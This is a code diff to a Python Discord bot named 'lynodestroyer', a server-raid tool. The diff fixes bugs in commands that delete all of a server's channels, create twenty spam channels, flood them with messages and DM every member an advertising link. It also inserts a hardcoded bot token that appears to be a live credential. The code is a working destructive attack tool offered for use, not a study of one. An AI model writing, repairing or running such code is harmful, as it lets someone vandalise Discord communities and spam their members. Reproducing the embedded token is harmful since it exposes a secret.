@@ -15,7 +15,7 @@ from discord.ext import commands
 # Change these index if you want
 
 # YOUR BOT TOKEN ( get it at https://discord.com/developers/applications):
-token = "your Bot Token"
+token = "MTE5MTI3MDYyMzcwODcyMTE4Mg.GVw9Eu.boGms9R2ERny-UFOtqL2tnod3LTnbNgSadP5tw"
 
 twitch = "https://twitch.tv/LynoConfigs" # your twitch profile
 
@@ -44,39 +44,36 @@ async def on_ready():
     print(f"Bot Is Online , Loggined As {lynodestroyer.user.name} , Lyno Is Active !")
     print(f"Commands : {prefix}nuke {prefix}delchan {prefix}createchan {prefix}ping")
     # it can be discord.Status.online , idle dnd streaming etc...
-
 @lynodestroyer.command()
 async def nuke(ctx):
     guild = ctx.guild
     channels = guild.channels
     user = ctx.author
-    for channels in channels:
-        await channels.delete()
-    
+    for channel in channels:
+        await channel.delete()
+
     for _ in range(20):
         await guild.create_text_channel(name=channelname)
-    
-    for channels in channels:
-        await channels.send(spammsg)
+
+    for channel in guild.channels:
+        await channel.send(spammsg)
     await user.send(f"{user.mention} Successfully Nuked The Server !")
 
     for member in guild.members:
         await member.send(f"{member.mention} https://dsc.gg/lyno = free bot")
-
 
 @lynodestroyer.command()
 async def delchan(ctx):
     guild = ctx.guild
     channels = guild.channels
     user = ctx.author
-    for channels in channels:
-        await channels.delete()
+    for channel in guild.channels:
+        await channel.delete()
     await user.send(f"{user.mention} Successfully Deleted All Channels !")
 
 @lynodestroyer.command()
 async def createchan(ctx):
     guild = ctx.guild
-    channels = guild.channels
     user = ctx.author
     for _ in range(20):
         await guild.create_text_channel(name=channelname)
@@ -85,10 +82,9 @@ async def createchan(ctx):
 @lynodestroyer.command()
 async def ping(ctx):
     guild = ctx.guild
-    channels = guild.channels
     user = ctx.author
-    for channels in channels:
-        await channels.send(spammsg)
+    for channel in guild.channels:
+        await channel.send(spammsg)
     await user.send(f"{user.mention} Successfully Spammed in Server !")
 
 
